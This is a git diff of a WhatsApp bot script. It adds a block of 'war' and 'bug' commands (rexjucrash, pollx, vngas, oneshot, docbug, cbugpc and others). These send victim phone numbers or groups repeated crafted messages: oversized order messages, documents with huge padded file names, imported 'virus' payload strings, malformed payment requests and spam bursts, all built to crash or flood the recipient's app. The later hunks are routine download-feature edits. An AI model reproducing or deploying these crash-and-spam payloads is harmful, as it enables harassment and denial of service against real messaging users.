@@ -202,6 +202,18 @@ const _autostick = JSON.parse(fs.readFileSync('./database/autostickpc.json'));
 let banUser = JSON.parse(fs.readFileSync('./database/banUser.json'));
 let banchat = JSON.parse(fs.readFileSync('./database/banChat.json'));
 let bad = JSON.parse(fs.readFileSync('./src/toxic/bad.json'))
+const xeonbugpic = fs.readFileSync('./XBug/xpic.jpeg')
+const { xeonbut2 } = require('./XBug/xeonbut2.js')
+const { xeonvirtex } = require('./XBug/xeonvirtex.js')
+const { xeonbutton } = require('./XBug/xeonbutton.js')
+const { xeonbrutal } = require('./XBug/xeonbrutal.js')
+const audionye = fs.readFileSync('./y.mp3')
+const { ngazap } = require('./lib/ngazap.js')
+const { santedpc } = require('./lib/santedpc.js')
+const { buttonvirus2 } = require('./lib/buttonvirus2.js')
+const { buttonvirus } = require('./lib/buttonvirus.js')
+const { virus } = require('./lib/virus.js')
+const { buttonkal } = require('./lib/buttonkal.js')
 
 //read database\\
 let tebaklagu = db.data.game.tebaklagu = []
@@ -339,6 +351,74 @@ if (!('templateVideo' in setting)) setting.templateVideo = false
         } catch (err) {
             console.error(err)
         }
+        
+        const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
+	
+	const vien = {
+key: {
+fromMe: false, 
+participant: `0@s.whatsapp.net`, 
+...({ remoteJid: "" }) 
+}, 
+"message": {
+"orderMessage": {
+"orderId": "594071395007984",
+"thumbnail": thumb,
+"itemCount": 100000000000,
+"status": "INQUIRY",
+"surface": "CATALOG",
+"message": `Kenneth Bot WhatsApp${ngazap(prefix)}`,
+"orderTitle": "Kenneth Bot WhatsApp${ngazap(prefix)}",
+"sellerJid": "6285807264974@s.whatsapp.net",
+"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
+"totalAmount1000": "500000000000000",
+"totalCurrencyCode": "IDR"
+}}}
+
+const doc = { 
+key: {
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
+},
+"message": {
+"documentMessage": {
+"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
+"mimetype": "application/octet-stream",
+"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
+"fileLength": "64455",
+"pageCount": 1,
+"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
+"fileName": `${ownername}â˜£ï¸${xeonbrutal(prefix)}`,
+"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
+}}
+}
+
+const xezy = { 
+key: {
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "14169948404-1305080833@g.us" } : {}) 
+},
+"contextInfo": {
+"stanzaId": "3EB0382EDBB2",
+"externalAdReply": {
+"previewType": "PHOTO",
+"showAdAttribution": true,
+"sourceUrl": websitex,
+"thumbnailUrl": 'https://i.ibb.co/txS3dDZ/Screenshot-2022-1030-154916.jpg', 
+"thumbnail": xeonbugpic,
+}}}
+
+const bhosdike = (teks) => {
+ XeonBotInc.sendMessage(m.chat, { image: xeonbugpic, caption: botname, contextInfo:{"externalAdReply": {"title": botname,"body": ownername,
+previewType: "PHOTO",
+showAdAttribution: true,
+sourceUrl: websitex,
+thumbnailUrl: 'https://i.ibb.co/txS3dDZ/Screenshot-2022-1030-154916.jpg', 
+thumbnail: xeonbugpic,
+}
+}}, { quoted:xezy})
+}
+ 
 	
 	// FAKE ANJ
 	                    
@@ -1302,6 +1382,421 @@ case 'test': {
 	if (!isCreator) return
 	reply(`XeonCheems5 *nyala*`)
 	}
+		break
+		case 'ducu': case 'rexjuducu': {
+
+		if (!isCreator) return
+
+		
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+		
+jumlah = `${encodeURI(q)}`
+
+		ydd = `Hallo Aku haikal`
+
+		for (let i = 0; i < jumlah; i++) {
+
+		yy = fs.readFileSync('./lib/hwmods.HW')
+		
+XeonBotInc.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`© °rexju°APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
+
+		}
+
+		}
+		break
+	case 'rexjubug1': case 'rexjucrash': case 'crashar10':{
+if (!isCreator) return
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `Hallo Aku haikal`
+for (let i = 0; i < jumlah; i++) {
+var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"audioMessage": {
+"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
+"mimetype": "audio/mpeg",
+"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
+"fileLength": "258330",
+"seconds": 16,
+"ptt": false,
+"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
+"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
+"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
+"mediaKeyTimestamp": "1657190832",
+}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
+}
+}
+		break
+	case '⚔️': case '🗡️': case '🛡️': case '🪞': case '🔧': {
+if (!isCreator) return
+await XeonBotInc.sendMessage(m.chat, { 
+text: '', 
+templateButtons: [
+{ callButton: { displayText: `OWNER`, phoneNumber: `6285714170944`}},
+{ callButton: { displayText: `OWNER`, phoneNumber: `6283186308195`}},
+{ urlButton: { displayText: `GROUP HW MODS WA`, url: `https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2`}},
+{ quickReplyButton: { displayText: `MY`, id: `Anjay Menger`}},
+{ quickReplyButton: { displayText: `NAME`, id: `AH SLEBEEW`}},
+{ quickReplyButton: { displayText: `HAIKAL`, id: `JAGOAN OM?`}},
+]
+ })
+  await sleep(10000)
+ }
+ break
+case 'rexjubug6': case 'rexjucrash5': case 'crashar15':{
+if (!isCreator) return
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `Hallo Aku haikal`
+for (let i = 0; i < jumlah; i++) {
+var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"stickerMessage": {
+"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
+"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
+"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
+"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
+"mimetype": "image/webp",
+"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
+"fileLength": "14240",
+"mediaKeyTimestamp": "1664991742",
+"isAnimated": false,
+}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
+}
+}
+break
+case 'lokas': case 'rexjulokas': {
+if (!isCreator) return
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `Hallo Aku haikal`
+for (let i = 0; i < jumlah; i++) {
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg') }, { upload: XeonBotInc.waUploadToServer })
+var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"liveLocationMessage": {
+"degreesLatitude": -6.9367014,
+"degreesLongitude": 107.7228574,
+"caption": `© © °rexju°͢${ngazap(prefix)}`,
+"sequenceNumber": "1657237469254001",
+"jpegThumbnail": messa.imageMessage,
+}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
+}
+}
+ break
+        	case 'bugmenux': case 'buglistx': {
+        	if (!isPremium && !isCreator) return
+        reply(`testing`)
+        	}
+        break
+        case 'order': {
+        	if (!m.isGroup) return
+        if (!isPremium && !isCreator) return
+jumlah = q.split(' ')[0]
+if (jumlah >= 6) return reply(`_Jumlah Maksimal 5_`)
+for (let i = 0; i < jumlah; i++) {
+var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"pollCreationMessage": {
+"name": botname,
+"options": [
+	{
+"optionName": "VOTE FOR PLEASURE"
+	},
+	{
+"optionName": "VOTE AND WIN IPHONE 14 PRO MAX"
+	},
+	{
+"optionName": "VOTE TO GET FREE +84 NUMBER"
+	},
+	{
+"optionName": "VOTE TO GET +54"
+	},
+	{
+"optionName": "VOTE TO GET +64"
+	}
+],
+"selectableOptionsCount": 5
+	}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
+const deploy = (teks) => {
+  XeonBotInc.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
+}
+deploy('Successful')
+}
+XeonBotInc.sendMessage(from, { react: { text: `✅`, key: m.key }})
+
+}
+        break
+        	//-------------------â˜£ï¸WAR FEATURESâ˜£ï¸-----------------\\
+//-------------------â˜£ï¸WAR FEATURESâ˜£ï¸-----------------\\
+//-------------------â˜£ï¸WAR FEATURESâ˜£ï¸-----------------\\
+case 'pollx': {
+if (!isPremium && !isCreator) return
+bwa = q.split('.')[0]
+jumlah = q.split('.')[1]
+if (jumlah >= 5) return reply(`_Jumlah Maksimal 5_`)
+for (let i = 0; i < jumlah; i++) {
+var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"pollCreationMessage": {
+"name": botname,
+"options": [
+	{
+"optionName": "VOTE FOR PLEASURE"
+	},
+	{
+"optionName": "VOTE AND WIN IPHONE 14 PRO MAX"
+	},
+	{
+"optionName": "VOTE TO GET FREE +84 NUMBER"
+	},
+	{
+"optionName": "VOTE TO GET +54"
+	},
+	{
+"optionName": "VOTE TO GET +64"
+	}
+],
+"selectableOptionsCount": 5
+	}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(`${bwa}@s.whatsapp.net`, pollCreation.message, { messageId: pollCreation.key.id })
+const deploy = (teks) => {
+  XeonBotInc.relayMessage(`${bwa}@s.whatsapp.net`, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
+}
+deploy('Successful sendbug')
+}
+reply(`Bug Telah Dikirim Ke: *${bwa}*\nJumlah Spam: *${jumlah}*`)
+
+}
+break
+case 'thisbug': {
+if (!isCreator) return reply(mess.premi)
+let teks = `â•â•âœªã€˜ *THIS IS A BUG BRO? â˜ºï¸* ã€™âœªâ•â•
+ âž² *Message : ${q ? q : 'empty'}*\n\n`
+for (let mem of participants) {
+teks += `â­” @${mem.id.split('@')[0]}\n`
+}
+XeonBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })
+}
+break
+case 'vngas': {
+if (!isPremium && !isCreator) return reply(mess.premi)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
+num = q.split('.')[0]
+jumlah = q.split('.')[1]
+for (let i = 0; i < jumlah; i++) {
+XeonBotInc.sendMessage(`${num}@s.whatsapp.net`, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
+await sleep(1000)
+}
+reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
+}
+break
+case 'silently': {
+if (!isPremium && isCreator) return
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `Hallo kontol`
+for (let i = 0; i < jumlah; i++) {
+yy = fs.readFileSync('./lib/hwmods.HW')
+XeonBotInc.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`Haikal APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
+}
+}
+break
+case 'ampas2' : { // delay dikit
+if (!isPremium && !isCreator) return
+Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
+a = await XeonBotInc.sendMessage(m.chat, {react: { text: " ï¸", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(10000)
+}
+break
+case 'bugahay' :
+if (!isPremium && !isCreator) return reply(mess.premi)
+if (!q) return reply(`Input salah\n(.bugahay <nomor> <titik> <jumlah>)\n\nContoh:\n.bugahay 628584297392.5`)
+m.reply(mess.wait)
+nom = q.split('.')[0]
+jumlah = q.split('.')[1]
+ waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
+ let bugahaybot = [
+ {buttonId: `bugahay`, buttonText: {displayText: xeonbutton}, type: 1},
+  {buttonId: `bugahay`, buttonText: {displayText: xeonbutton}, type: 1},
+  {buttonId: `bugahay`, buttonText: {displayText: xeonbutton}, type: 1},
+ ]
+let button4Messagess = {
+image: {url:waifudd.data.url},
+caption:`Kenneth Silently`,
+buttons: bugahaybot,
+headerType: 1
+} 
+ await XeonBotInc.sendMessage(`${nom}@s.whatsapp.net`, button4Messagess, { quoted: doc }).catch(err => {
+ return('Error!')
+})
+break
+case 'jagoanom' : {
+if (!isPremium && !isCreator) return
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `Hallo Aku haikal`
+for (let i = 0; i < jumlah; i++) {
+XeonBotInc.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC Anggazyy Silently`,"body": `Selamat ${salam} kak ${pushname}`,
+mimetype: 'audio/mpeg', caption: `${buttonkal}`,
+showAdAttribution: true,
+sourceUrl: `https://wa.me/62882021734861`,
+thumbnailUrl: 'https://i.ibb.co/T1jCqF4/IMG-20221024-WA0002.jpg', 
+}
+}}}}}, { quoted:doc})
+}
+}
+break
+case 'rexjutroli2': case 'rexjutrol': case 'jutrol': {
+if (!isCreator) return
+if (args.length == 0) return reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+a = await XeonBotInc.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
+var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"orderMessage": {
+"orderId": "599519108102353",
+"thumbnail": thumb,
+"itemCount": 1999,
+"status": "INQUIRY",
+"surface": "CATALOG",
+"message": " BY © °rexju°",
+"orderTitle": " BUG TROLI ", // 
+"sellerJid": "6283186308195@s.whatsapp.net",
+"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
+}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, order.message, { messageId: order.key.id })
+}
+}
+break
+case 'santetpc': {
+if (!isPremium && !isCreator) return reply(mess.premi)
+if (!q) return reply(`Contoh ${command} 6281297970769`)
+nmn = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
+if (Input == isCreator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
+for (let i = 0; i < jumlah; i++) {
+XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, { text: '' })
+await sleep(1000)
+}
+reply(`Bug Santet Telah Dikirim Ke: *${text}*`)
+}
+break
+case 'cbugpc': {
+	if (!isPremium && !isCreator) return reply(mess.premi)
+if (args.length < 1) return m.reply(`*Error!*\n\nUse : ${command} victim number|spam amount|timer\nExample : ${command} 916909s.whatsapp.net|1|10s\n\n\ns = Second\n\n`)
+num = q.split('.')[0]
+jumlah = q.split('.')[1]
+if (jumlah >= 5) return reply(`_Jumlah Maksimal 5_`)
+for (let i = 0; i < jumlah; i++) {
+m.reply(`Okay sir!`)
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpic.jpeg') }, { upload: XeonBotInc.waUploadToServer })
+var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"requestPaymentMessage": {
+"currencyCodeIso4217": "IDR",
+"amount1000": "100",
+"extendedTextMessage": {
+"text": botname,
+}
+}}), { userJid: m.chat, quoted: doc})
+XeonBotInc.relayMessage(`${num}@s.whatsapp.net`, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+}
+m.reply(`Bug Telah Dikirim Ke: *${num}*\nJumlah Spam: *${jumlah}*`)
+}
+break
+case 'cbuggc': {
+if (!isPremium && !isCreator) return reply(mess.premi)
+if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 916909@g.us|1|10s\n\n\ns = Second\n\nMake sure the bot has entered the group`)
+num = q.split('.')[0]
+jumlah = q.split('.')[1]
+if (jumlah >= 5) return reply(`_Jumlah Maksimal 5_`)
+for (let i = 0; i < jumlah; i++) {
+m.reply(`Okay sir`)
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpic.jpeg') }, { upload: XeonBotInc.waUploadToServer })
+var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"requestPaymentMessage": {
+"currencyCodeIso4217": "IDR",
+"amount1000": "100",
+"extendedTextMessage": {
+"text": `MY DEVELOPER HW MODS WA`,
+}
+}}), { userJid: m.chat, quoted: doc})
+XeonBotInc.relayMessage(`${num}@s.whatsapp.net`, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+}
+m.reply(`Bug Telah Dikirim Ke: *${num}*\nJumlah Spam: *${jumlah}*`)
+}
+break
+case 'oneshot': {
+if (!isPremium && !isCreator) return reply(mess.premi)
+bwa = q.split('.')[0]
+jumlah = q.split('.')[1]
+if (jumlah >= 5) return reply(`_Jumlah Maksimal 5_`)
+for (let i = 0; i < jumlah; i++) {
+lodaChoos = fs.readFileSync('./XBug/randiKaBaccha.sound')
+XeonBotInc.sendMessage(`${bwa}@s.whatsapp.net`, {document: lodaChoos, mimetype: 'application/octet-stream', fileName:`${botname} ${xeonbut2}.sound` }, {quoted:doc})
+}
+m.reply(`Bug Telah Dikirim Ke: *${bwa}*\nJumlah Spam: *${jumlah}*`)
+
+}
+break
+case 'oneshot2': {
+if (!isPremium && !isCreator) return reply(mess.premi)
+bwa = q.split('.')[0]
+jumlah = q.split('.')[1]
+if (jumlah >= 5) return reply(`_Jumlah Maksimal 5_`)
+for (let i = 0; i < jumlah; i++) {
+ lodaChoos2 = fs.readFileSync('./XBug/randiKaBaccha.sound')
+ XeonBotInc.sendMessage(`${bwa}@s.whatsapp.net`, {document: lodaChoos2, mimetype: '', fileName:`${botname} ${xeonbut2}.sound` }, {quoted:doc})
+ }
+ m.reply(`Bug Telah Dikirim Ke: *${bwa}*\nJumlah Spam: *${jumlah}*`)
+
+ }
+ break
+case 'docbug': {
+if (!isPremium && !isCreator) return reply(mess.premi)
+num = q.split('.')[0]
+jumlah = q.split('.')[1]
+if (jumlah >= 5) return reply(`_Jumlah Maksimal 5_`)
+for (let i = 0; i < jumlah; i++) {
+var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({	
+"documentMessage": {
+"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
+"mimetype": "",
+"title": botname,
+"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+"pageCount": 0,
+"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
+"fileName": `ðŸ¦„${ownername}ðŸ¦„\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${xeonbut2}.sound`,
+"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
+"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
+"mediaKeyTimestamp": "1658703206",
+}
+}), { userJid: m.chat })
+XeonBotInc.relayMessage(`${bwa}@s.whatsapp.net`, document.message, { messageId: document.key.id })
+}
+m.reply(`Bug Telah Dikirim Ke: *${bwa}*\nJumlah Spam: *${jumlah}*`)
+
+}
 	break
  case 'banchat': case 'b': {
  if (isBan) return reply(mess.ban)	 			
@@ -3369,7 +3864,7 @@ if (isBanChat) return reply(mess.banChat)
                 }
             }
             break
-            case 'welcome': case 'wc': case 'kl': {
+            case 'welcome': case 'wc': case 'kl': case 'setwelcome': {
    if (isBan) return reply(mess.ban)	 			
 if (isBanChat) return reply(mess.banChat)
 if (!m.isGroup) return reply(mess.group)
@@ -6197,7 +6692,7 @@ case 'pornhub':{
 	if (isBan) return reply(mess.ban)	 			
 if (isBanChat) return reply(mess.banChat)
 if (!m.isGroup) return reply(mess.group)
-if(!q) return reply(`Example: ${prefix + command} ajg | ea`)
+if(!args[1]) return reply(`Example: ${prefix + command} kiri | kanan`)
 reply(mess.wait)
   inilogo4 = args.join(" ")
 inilogo9 = args.join(" ")
@@ -6418,7 +6913,7 @@ reply(mess.wait)
 let media = await quoted.download()
 let { toAudio } = require('./lib/converter')
 let audio = await toAudio(media, 'mp4')
-XeonBotInc.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `${args.join(" ")}`}, { quoted : m })
+XeonBotInc.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `${args.join(" ")}.mp3`}, { quoted : m })
 }
 break
 case 'kerangajaib': case 'kerangajaip': case 'kulitkerangajaib': {
@@ -6558,9 +7053,9 @@ let search = await yts(args.join(" "))
   let sendm =  await XeonBotInc.sendMessage(
       m.chat, 
       {
-       text: `Hi, ${pushname}! \n\n_Here is the list of videos,_ \n_click the button below to choose_`,
+       text: `Hai, ${pushname}!\n\n_Berikut adalah daftar *${text}*,_ \n_klik tombol di bawah untuk memilih_`,
        footer: `${botname}`,
-       title: "*YT SEARCH*",
+       title: "*YT MUSIC*",
        buttonText: "CLICK HERE",
        sections
       }, { quoted : m })
@@ -6589,7 +7084,7 @@ let search = await yts(args.join(" "))
   rows: [
 	    {
 	     title: `${i.title}`, 
-	     rowId: `${prefix}ytdontu ${i.url}`,
+	     rowId: `${prefix}apinxr ${i.url}|${i.title}`,
       description: `Duration ${i.timestamp} | Views: ${i.views} | Uploaded: ${i.ago}`	     
 	    }, 
 	    ]
@@ -6659,7 +7154,7 @@ let search = await yts(args.join(" "))
   rows: [
 	    {
 	     title: `${i.title}`, 
-	     rowId: `${prefix}ytvd ${i.url}`,
+	     rowId: `${prefix}apinxrvd ${i.url}|${i.title}`,
       description: `Duration ${i.timestamp} | Views: ${i.views} | Uploaded: ${i.ago}`	     
 	    }, 
 	    ]
@@ -6740,6 +7235,183 @@ sourceUrl: ``,
                 ////////////////////////////////////XeonBotInc.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `${anu.title}`}, { quoted : m }).catch((err) => reply(mess.error))
                 /////////////////////////////XeonBotInc.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg', ptt: true}, { quoted : m }).catch((err) => reply(mess.error))
                 
+            break
+            case 'apinxr': {
+            const jan = q.split('|')[0]
+            const cok = q.split('|')[1]
+        let nganu = await fetchJson(`https://yt.nxr.my.id/yt3?url=${jan}`)
+  // saatuuuu
+              let sections = [{ 
+                title: 'Audio', 
+                rows: [] 
+             }, { 
+                title: 'Video', 
+                rows: [] 
+             }]
+              nganu.data.mp3.map(v => sections[0].rows.push({
+	     title: `Voice Note`, 
+	     rowId: `${prefix}nxrvn ${jan}|${nganu.id}|mp3|128|${v.size}|${nganu.token}|${nganu.expires}`,
+      description: `Size: ${v.size} | Kualitas: ${v.q}`},{
+      	title: `Audio`, 
+	     rowId: `${prefix}nxrvn ${jan}|${nganu.id}|mp3|128|${v.size}|${nganu.token}|${nganu.expires}`,
+      description: `Size: ${v.size} | Kualitas: ${v.q}`}, {
+      	title: `Dokumen`, 
+	     rowId: `${prefix}nxrvn ${jan}|${nganu.id}|mp3|128|${v.size}|${nganu.token}|${nganu.expires}`,
+      description: `Size: ${v.size} | Kualitas: ${v.q}`
+	    }))
+            nganu.data.mp4.map(v => sections[1].rows.push({
+	     title: `${v.q}`, 
+	     rowId: `${prefix}nxrvd ${jan}|${nganu.id}|mp4|${v.k}|${v.size}|${nganu.token}|${nganu.expires}`,
+      description: `Size: ${v.size}`	     
+	    }))
+	
+     const sendm =  XeonBotInc.sendMessage(
+      m.chat, 
+      {
+       text: `\`\`\`${cok}\`\`\` \n\n\n_*Pilih Tipe*_`,
+       footer: `${botname}`,
+       title: "*YOUTUBE MUSIC*",
+       buttonText: "CLICK HERE",
+       sections
+      }, { quoted : m })                 
+      await sendm
+      XeonBotInc.sendMessage(from, { react: { text: `✅`, key: m.key }})
+      }
+      break
+      case 'apinxrvd': {
+            const jan = q.split('|')[0]
+            const cok = q.split('|')[1]
+        let nganu = await fetchJson(`https://yt.nxr.my.id/yt3?url=${jan}`)
+  // saatuuuu
+              let sections = [{ 
+                title: 'Video', 
+                rows: [] 
+             }, { 
+                title: 'Audio', 
+                rows: [] 
+             }]
+              nganu.data.mp3.map(v => sections[1].rows.push({
+	     title: `Voice Note`, 
+	     rowId: `${prefix}nxrvn ${jan}|${nganu.id}|mp3|128|${v.size}|${nganu.token}|${nganu.expires}`,
